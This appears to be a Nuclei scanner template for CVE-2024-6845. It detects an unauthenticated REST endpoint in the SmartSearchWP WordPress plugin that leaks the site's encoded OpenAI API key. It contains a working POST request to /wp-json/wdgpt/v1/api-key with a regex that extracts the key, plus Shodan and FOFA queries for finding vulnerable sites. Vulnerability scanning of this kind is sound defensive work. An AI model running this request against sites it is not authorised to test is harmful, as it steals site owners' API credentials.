id: CVE-2024-6845

info:
  name: SmartSearchWP < 2.4.6 - OpenAI Key Disclosure
  author: s4e-io
  severity: medium
  description: |
    The plugin does not have proper authorization in one of its REST endpoint, allowing unauthenticated users to retrieve the encoded key and then decode it, thereby leaking the OpenAI API key.
  remediation: Fixed in 2.4.6
  reference:
    - https://wpscan.com/vulnerability/cfaaa843-d89e-42d4-90d9-988293499d26/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-6845
    - https://github.com/fkie-cad/nvd-json-data-feeds
    - https://github.com/20142995/nuclei-templates
    - https://github.com/cyb3r-w0lf/nuclei-template-collection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-6845
    cwe-id: CWE-862
    epss-score: 0.03199
    epss-percentile: 0.86379
    cpe: cpe:2.3:a:smartsearchwp:smartsearchwp:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: smartsearchwp
    product: smartsearchwp
    framework: wordpress
    fofa-query: body="/wp-content/plugins/smartsearchwp"
    publicwww-query: "/wp-content/plugins/smartsearchwp"
    shodan-query: http.html:"/wp-content/plugins/smartsearchwp"
  tags: wpscan,cve,cve2024,exposure,wp,wordpress,wp-plugin,smartsearchwp,webdigit
flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"/wp-content/plugins/smartsearchwp")'
          - 'status_code == 200'
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-json/wdgpt/v1/api-key HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"key": "U2FsdGVkX1+X"}

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type,"application/json")'
          - 'status_code == 200'
        condition: and

    extractors:
      - type: regex
        part: body
        name: api-key
        regex:
          - '"([^"]+)"'
# digest: 490a00463044022072cd65cc2ce18085cb53b6de883e6491dae3b16dec9c84bac5da088e36cdc02002203c4816c8636fc8c46091fcb6a881d0fece5fa5ee65b1a0a5b5d44492b4d884dd:922c64590222798bb761d5b6d8e72950